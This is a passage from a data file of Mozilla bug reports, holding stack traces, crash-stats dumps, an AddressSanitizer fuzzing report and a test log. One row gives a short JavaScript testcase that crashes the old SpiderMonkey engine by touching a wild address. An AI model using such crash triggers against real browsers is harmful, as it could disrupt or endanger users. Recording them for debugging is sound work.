/home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsobj.cpp:3798 #13 0x00002aaaaad3235b in JS_GetUCProperty (cx=0x3bd9620, obj=0x2bc0580, name=<value optimized out>,      namelen=<value optimized out>, vp=0x7fff48a01e48) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsapi.cpp:3844 #14 0x00002aaab0b2c815 in nsWindowSH::GetProperty (this=<value optimized out>, wrapper=<value optimized out>, cx=0x3bd9620,      obj=0x2bc00c0, id=<value optimized out>, vp=0x7fff48a01e48, _retval=0x7fff48a01ba4)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsDOMClassInfo.cpp:4633 #15 0x00002aaab0228cf2 in XPC_WN_Helper_GetProperty (cx=0x3bd9620, obj=0x2bc00c0, idval=7802996, vp=0x7fff48a01e48)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp:954 #16 0x00002aaaaad7e810 in js_GetPropertyHelper (cx=0x3bd9620, obj=0x2bc00c0, id=7802996, vp=0x7fff48a01e48, entryp=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsobj.cpp:3755 #17 0x00002aaaaad623db in js_Interpret (cx=0x3bd9620) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:4682 #18 0x00002aaaaad6f897 in js_Invoke (cx=0x3bd9620, argc=3, vp=0x2752088, flags=0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1324 #19 0x00002aaab021db98 in nsXPCWrappedJSClass::CallMethod (this=0xc6e300, wrapper=<value optimized out>, methodIndex=3,      info=0x6cfd60, nativeParams=0x7fff48a02380)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappedjsclass.cpp:1549 #20 0x00002aaaab28ba0a in PrepareAndDispatch (self=0x1ac8ea0, methodIndex=<value optimized out>, args=<value optimized out>,      gpregs=0x7fff48a02460, fpregs=0x7fff48a02490)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:151 #21 0x00002aaaab28ada7 in SharedStub ()     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/reflect/xptinfo/src/xptiprivate.h:384 #22 0x00002aaaab24573f in nsObserverList::NotifyObservers (this=0x130f0a8, aSubject=0x3bd8698,      aTopic=0x3194d10 ""download-manager-ui-done"", someData=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/ds/nsObserverList.cpp:128 #23 0x00002aaaab245eda in nsObserverService::NotifyObservers (this=<value optimized out>, aSubject=0x3bd8698,      aTopic=0x3194d10 ""download-manager-ui-done"", someData=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/ds/nsObserverService.cpp:181 #24 0x00002aaaab28acf7 in NS_InvokeByIndex_P (that=0x6bfa10, methodIndex=5, paramCount=3, params=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_linux.cpp:208 ---Type <return> to continue, or q <return> to quit--- #25 0x00002aaab0223cf8 in XPCWrappedNative::CallMethod (ccx=@0x7fff48a02990, mode=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappednative.cpp:2402 #26 0x00002aaab022920a in XPC_WN_CallMethod (cx=0x3bd9620, obj=0x683380, argc=3, argv=0x2752060, vp=0x7fff48a02b78)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1477 #27 0x00002aaaaad6f822 in js_Invoke (cx=0x3bd9620, argc=3, vp=0x2752050, flags=2)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1306 #28 0x00002aaaaad5df56 in js_Interpret (cx=0x3bd9620) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:5015 #29 0x00002aaaaad6f897 in js_Invoke (cx=0x3bd9620, argc=1, vp=0x2752038, flags=0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1324 #30 0x00002aaaaad6fcea in js_InternalInvoke (cx=0x3bd9620, obj=0x2bc0580, fval=18063936, flags=0, argc=1, argv=0xb82970,      rval=0x7fff48a030d8) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1381 #31 0x00002aaaaad260b4 in JS_CallFunctionValue (cx=0x3bd9620, obj=0x2bc0580, fval=18063936, argc=1, argv=0xb82970,      rval=0x7fff48a030d8) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsapi.cpp:5235 #32 0x00002aaab0af6e7f in nsJSContext::CallEventHandler (this=0x2c466f0, aTarget=<value optimized out>,      aScope=<value optimized out>, aHandler=0x113a240, aargv=0x2b554b8, arv=0x7fff48a03240)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsJSEnvironment.cpp:1985 #33 0x00002aaab0b06d12 in nsGlobalWindow::RunTimeout (this=0x1ec04f0, aTimeout=0x31a3fa0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsGlobalWindow.cpp:7658 #34 0x00002aaab0b0b4da in nsGlobalWindow::TimerCallback (aTimer=<value optimized out>, aClosure=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsGlobalWindow.cpp:7990 #35 0x00002aaaab27e1df in nsTimerImpl::Fire (this=0x309c400)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/threads/nsTimerImpl.cpp:420 #36 0x00002aaaab27ecfc in nsTimerEvent::Run (this=0x2aaabc01a170)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/threads/nsTimerImpl.cpp:512 #37 0x00002aaaab27aee1 in nsThread::ProcessNextEvent (this=0x66bf90, mayWait=1, result=0x7fff48a0339c)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/threads/nsThread.cpp:510 #38 0x00002aaaab238793 in NS_ProcessNextEvent_P (thread=0x1385, mayWait=1) at nsThreadUtils.cpp:227 #39 0x00002aaab9df5212 in nsBaseAppShell::Run (this=0xd2a4d0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/widget/src/xpwidgets/nsBaseAppShell.cpp:170 #40 0x00002aaab7631771 in nsAppStartup::Run (this=0xd13d20)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/toolkit/components/startup/src/nsAppStartup.cpp:182 #41 0x00002aaaaaae9f75 in XRE_main (argc=<value optimized out>, argv=<value optimized out>, aAppData=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/toolkit/xre/nsAppRunner.cpp:3263 #42 0x0000000000400eca in main (argc=5, argv=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/browser/app/nsBrowserApp.cpp:156","JS Assertion when running chrome test, Assertion failure: OBJ_BLOCK_DEPTH(cx, obj) == pcdepth, at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:5200"
24880,Changing the file path from VID_0001.3gp to for instance DCIM/VID_0001.3gp when calling cameraObj.startRecording results in an error callback.,Cant specify sub directories for videos in CameraControl API
24898,"Created attachment 564094 FF_fail.txt  User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Build ID: 20110928134238  Steps to reproduce:  Tried using a bookmarklet that worked fine in FF 6.x   Actual results:  FF crashes (tried in both W2K and 64 bit Win 7)   Expected results:  Should have worked - returns a link from within the XML document.   I think it fails at: document.replaceChild(f,document.firstChild)","crash nsXMLPrettyPrinter::Unhook ,  I believe document.replaceChild (in bookmarklet) crashes FF 7.x"
24950,"+[(e = {}, (function () e)()) for each (e in ["""", {}, """", {}, """"])][4];  Crash [@ js_ValueToNumber] touching 0x20000000  +[(e = {}, (function () e)()) for each (e in ["""", {}, """", {}, """"])];  Crash [@ JS_Enumerate] touching 0x20000000",TM: crash [@ js_ValueToNumber] or [@ JS_Enumerate]; corrupted array?
25069,"As far as I can tell security@mozilla.org is always mailed when a *new* bug is filed with the security group box checked. At least some of the time we're mailed when the group is UN-set, but there are several times I know of that I have gone to a newly filed security bug and found that the security group checkmark has been removed but no mail is ever received.  This makes me wonder if there are times when the group is set on non-new bugs that I'm not getting mail for, and of course not knowing when a bug goes public is itself a potentially bad thing.  Could this have something to do with UNCONFIRMED bugs? I don't know if this has always been true, but the recent ones that have exhibited this problem were all UNCO bugs. Could the security@mozilla.org account be set not to be mailed on UNCO bugs?  This problem *might* be since the recent BMO upgrade, I can't remember when I first started noticing this. It's possible it's been around longer and I only noticed recently now that a new member of the security group has started to help triage the incoming.",Not always mailed when security group removed
25175,"It's #14 top crasher in the first days of 13.0b1.  Signature 	msvcr100.dll@0x8af06 More Reports Search UUID	ac51f3e2-2c7e-4072-ab88-385122120428 Date Processed	2012-04-28 09:35:12 Process Type	plugin Version: Filename: NPSWF32_11_3_300_231.dll Uptime	3146 Install Age	1.8 days since version was first installed. Install Time	2012-04-26 14:42:11 Product	Firefox Version	13.0 Build ID	20120425123149 Release Channel	beta OS	Windows NT OS Version	6.1.7601 Service Pack 1 Build Architecture	x86 Build Architecture Info	GenuineIntel family 6 model 42 stepping 7 Crash Reason	EXCEPTION_NONCONTINUABLE_EXCEPTION Crash Address	0x0 App Notes 	 AdapterVendorID: 0x10de, AdapterDeviceID: 0x0dc6, AdapterSubsysID: 23621462, AdapterDriverVersion: 8.17.13.132 D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+  EMCheckCompatibility	True  Frame 	Module 	Signature 	Source 0 	msvcr100.dll 	msvcr100.dll@0x8af06 	 1 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30541c 	 2 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x302fd5 	 3 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3147c0 	 4 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30342f 	 5 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x305bb7 	 6 	user32.dll 	MsgWaitForMultipleObjects 	 7 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x318019 	 8 	KERNELBASE.dll 	WaitForSingleObjectEx 	 9 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x306549 	 10 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30511f 	 11 	ntdll.dll 	WinSqmSetIfMaxDWORD 	 12 	ntdll.dll 	RtlpLowFragHeapAllocFromContext 	 13 	ntdll.dll 	RtlAllocateHeap 	 14 	ntdll.dll 	RtlFreeHeap 	 15 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30706f 	 16 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fde02 	 17 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30ba1f 	 18 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30bd0f 	 19 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30a63d 	 20 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30e4eb 	 21 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x31ce16 	 22 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30cf77 	 23 	ntdll.dll 	NtClearEvent 	 24 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30ed68 	 25 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x7ba977 	 26 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x7ba917 	 27 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30f8a2 	 28 	ntdll.dll 	RtlAllocateHeap 	 29 	ntdll.dll 	RtlFreeHeap 	 30 	ntdll.dll 	RtlpLowFragHeapAllocFromContext 	 31 	ntdll.dll 	RtlAllocateHeap 	 32 	ntdll.dll 	RtlFreeHeap 	 33 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1cc36d 	 34 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccb4d 	 35 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccb4d 	 36 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccc51 	 37 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccd84 	 38 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccd97 	 39 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3150bd 	 40 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3000db 	 41 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3150ab 	 42 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30c2ed 	 43 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30a54e 	 44 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fda52 	 45 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fd40c 	 46 	ntdll.dll 	RtlFreeHeap 	 47 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x670374 	 48 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x66dbb7 	 49 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fd8a7 	 50 	xul.dll 	mozilla::plugins::PluginModuleChild::AnswerPPluginInstanceConstructor 	dom/plugins/ipc/PluginModuleChild.cpp:2075 51 	xul.dll 	mozilla::plugins::PPluginModuleChild::OnCallReceived 	obj-firefox/ipc/ipdl/PPluginModuleChild.cpp:1099 52 	xul.dll 	mozilla::ipc::RPCChannel::DispatchIncall 	ipc/glue/RPCChannel.cpp:517 53 	xul.dll 	mozilla::ipc::RPCChannel::OnMaybeDequeueOne 	ipc/glue/RPCChannel.cpp:430 54 	xul.dll 	MessageLoop::RunTask 	ipc/chromium/src/base/message_loop.cc:318 55 	xul.dll 	MessageLoop::DeferOrRunPendingTask 	ipc/chromium/src/base/message_loop.cc:326 56 	xul.dll 	MessageLoop::DoWork 	ipc/chromium/src/base/message_loop.cc:426 57 	xul.dll 	base::MessagePumpForUI::DoRunLoop 	ipc/chromium/src/base/message_pump_win.cc:214 58 	xul.dll 	base::MessagePumpWin::RunWithDispatcher 	ipc/chromium/src/base/message_pump_win.cc:53 59 	xul.dll 	base::MessagePumpWin::Run 	ipc/chromium/src/base/message_pump_win.h:78 60 	xul.dll 	MessageLoop::RunInternal 	ipc/chromium/src/base/message_loop.cc:208 61 	xul.dll 	MessageLoop::RunHandler 	ipc/chromium/src/base/message_loop.cc:194 62 	xul.dll 	MessageLoop::Run 	ipc/chromium/src/base/message_loop.cc:175 63 	xul.dll 	XRE_InitChildProcess 	toolkit/xre/nsEmbedFunctions.cpp:513 64 	xul.dll 	XRE_StringToChildProcessType 	toolkit/xre/nsEmbedFunctions.cpp:244 65 	plugin-container.exe 	__tmainCRTStartup 	crtexe.c:552 66 	kernel32.dll 	BaseThreadInitThunk 	 67 	ntdll.dll 	__RtlUserThreadStart 	 68 	ntdll.dll 	_RtlUserThreadStart  More reports at: https://crash-stats.mozilla.com/report/list?signature=msvcr100.dll%400x8af06",[adbe 3517597] Flash crash in F_1522300002
25194,This bug was filed from the Socorro interface and is  report bp-3241a252-579c-412a-bf85-304372151003. =============================================================  Crash playing HTML video on a Galaxy S5.,crash in libhwui.so@0x426fe
25283,This bug was filed from the Socorro interface and is  report bp-782b17a4-5e34-4c14-adad-68bbb0170507. =============================================================  https://hg.mozilla.org/mozilla-central/annotate/37a5b7f6f101/dom/media/MediaShutdownManager.cpp#l77  AddBlocker() failed because main thread was shutting down.,Crash in mozilla::MediaShutdownManager::InitStatics
25295,"In Netscape 6.0 test blitz,  Browser crashed when hitting Ctrl+Shift+(Tab/Esc/Return/Copy/Del/F#/->/..) keys.  It was fine when hitting Ctrl+Shift+(Numbers/Letters).","Browser crashed when hit ""Ctrl+Shift+(Tab/Esc/Return/F#/->)key."
25326,"Created attachment 8941510 trigger.html  Testcase found while fuzzing mozilla-central rev d5f42a23909e.  ==16524==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000028 (pc 0x7ff95bde72b1 bp 0x7ff93fbf9d90 sp 0x7ff93fbf9cc0 T34) ==16524==The signal is caused by a READ memory access. ==16524==Hint: address points to the zero page.     #0 0x7ff95bde72b0 in GraphRate /builds/worker/workspace/build/src/dom/media/StreamTracks.h:195:12     #1 0x7ff95bde72b0 in GraphRate /builds/worker/workspace/build/src/dom/media/MediaStreamGraph.h:278     #2 0x7ff95bde72b0 in AddTrack /builds/worker/workspace/build/src/dom/media/MediaStreamGraph.h:739     #3 0x7ff95bde72b0 in mozilla::MediaEngineDefaultVideoSource::Start(mozilla::SourceMediaStream*, int, nsMainThreadPtrHandle<nsIPrincipal> const&) /builds/worker/workspace/build/src/dom/media/webrtc/MediaEngineDefault.cpp:187     #4 0x7ff95b79bbe9 in mozilla::GetUserMediaStreamRunnable::Run()::{lambda()#1}::operator()() /builds/worker/workspace/build/src/dom/media/MediaManager.cpp:1227:44     #5 0x7ff95b79b42c in mozilla::media::LambdaTask<mozilla::GetUserMediaStreamRunnable::Run()::{lambda()#1}>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/media/MediaTaskUtils.h:37:5     #6 0x7ff95588c4fd in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14     #7 0x7ff9558a7fb0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10     #8 0x7ff95673f845 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:364:5     #9 0x7ff956691ff9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10     #10 0x7ff956691ff9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319     #11 0x7ff956691ff9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299     #12 0x7ff9566b156f in base::Thread::ThreadMain() /builds/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:181:16     #13 0x7ff9566a2fdc in ThreadFunc(void*) /builds/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:38:13     #14 0x7ff9759aa6b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)     #15 0x7ff974a2c3dc in clone /build/glibc-bfm8X4/glibc-2.23/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109  AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /builds/worker/workspace/build/src/dom/media/StreamTracks.h:195:12 in GraphRate Thread T34 (MediaManager) created by T0 (file:// Content) here:     #0 0x4ac52d in __interceptor_pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:204:3     #1 0x7ff9566a092f in CreateThread /builds/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:135:14     #2 0x7ff9566a092f in PlatformThread::Create(unsigned long, PlatformThread::Delegate*, unsigned long*) /builds/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:146     #3 0x7ff9566b0f0f in base::Thread::StartWithOptions(base::Thread::Options const&) /builds/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:99:8     #4 0x7ff95b72a2f8 in mozilla::MediaManager::Get() /builds/worker/workspace/build/src/dom/media/MediaManager.cpp:1863:36     #5 0x7ff95b603cae in mozilla::dom::MediaDevices::GetUserMedia(mozilla::dom::MediaStreamConstraints const&, mozilla::dom::CallerType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/media/MediaDevices.cpp:194:9     #6 0x7ff95922436f in getUserMedia /builds/worker/workspace/build/src/obj-firefox/dom/bindings/MediaDevicesBinding.cpp:185:45     #7 0x7ff95922436f in mozilla::dom::MediaDevicesBinding::getUserMedia_promiseWrapper(JSContext*, JS::Handle<JSObject*>, mozilla::dom::MediaDevices*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/MediaDevicesBinding.cpp:202     #8 0x7ff95ab7400f in mozilla::dom::GenericPromiseReturningBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3088:13     #9 0x7ff9616980a4 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15     #10 0x7ff9616980a4 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473     #11 0x7ff961699102 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10     #12 0x7ff9624652f2 in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:176:12     #13 0x7ff962412dbd in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:359:23     #14 0x7ff9624434f1 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:511:21     #15 0x7ff962445d84 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:770:12     #16 0x7ff961698862 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15     #17 0x7ff961698862 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:455     #18 0x7ff9616830d6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12     #19 0x7ff9616830d6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096     #20 0x7ff961669a70 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12     #21 0x7ff96169b041 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:706:15     #22 0x7ff96169b7df in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:738:12     #23 0x7ff9621920f6 in ExecuteScript(JSContext*, JS::AutoObjectVector&, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/jsapi.cpp:4712:12     #24 0x7ff958c30bb6 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:266:8     #25 0x7ff95cae8ffd in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2233:25     #26 0x7ff95cae3289 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1876:10     #27 0x7ff95cac891b in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1574:10     #28 0x7ff95cac4b39 in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:147:18     #29 0x7ff9579ea6a6 in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:240:18     #30 0x7ff9579ea6a6 in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:736     #31 0x7ff9579e3aed in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:540:7     #32 0x7ff9579efa2b in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:131:20     #33 0x7ff955865cc0 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:395:25     #34 0x7ff95588c4fd in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14     #35 0x7ff9558a7fb0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10     #36 0x7ff95673e44a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21     #37 0x7ff956691ff9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10     #38 0x7ff956691ff9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319     #39 0x7ff956691ff9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299     #40 0x7ff95cc7718a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27     #41 0x7ff9613ac41b in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:877:22     #42 0x7ff956691ff9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10     #43 0x7ff956691ff9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319     #44 0x7ff956691ff9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299     #45 0x7ff9613abe01 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:703:34     #46 0x4f2dfc in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30     #47 0x4f2dfc in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280     #48 0x7ff97494582f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291  ==16524==ABORTING",Crash near null [@ GraphRate]
25375,"http://tinderbox.mozilla.org/showlog.cgi?log=Firefox/1289450808.1289451961.15274.gz Rev3 MacOSX Snow Leopard 10.6.2 mozilla-central debug test mochitest-other on 2010/11/10 20:46:48  TEST-START | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js ++DOCSHELL 0x1401f7d90 == 17 ++DOMWINDOW == 82 (0x135abcda0) [serial = 976] [outer = 0x0] ++DOMWINDOW == 83 (0x1401f8380) [serial = 977] [outer = 0x135abcd30] WARNING: NS_ENSURE_TRUE(sf) failed: file /builds/slave/mozilla-central-macosx64-debug/build/docshell/base/nsDocShell.cpp, line 4933 WARNING: NS_ENSURE_TRUE(sf) failed: file /builds/slave/mozilla-central-macosx64-debug/build/docshell/base/nsDocShell.cpp, line 4933 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 ++DOMWINDOW == 84 (0x13ea62d70) [serial = 978] [outer = 0x135abcd30] WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | There is one group item on startup TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | There should be two tab items in that group. TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | The currently selected tab should be the first tab in the groupItemOne JavaScript strict warning: chrome://browser/content/tabview.js, line 3090: reference to undefined property ""childWidth"" JavaScript strict warning: chrome://browser/content/tabview.js, line 3090: reference to undefined property ""columns"" TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | New tab button exists ++DOCSHELL 0x12bad8200 == 18 ++DOMWINDOW == 85 (0x13da35290) [serial = 979] [outer = 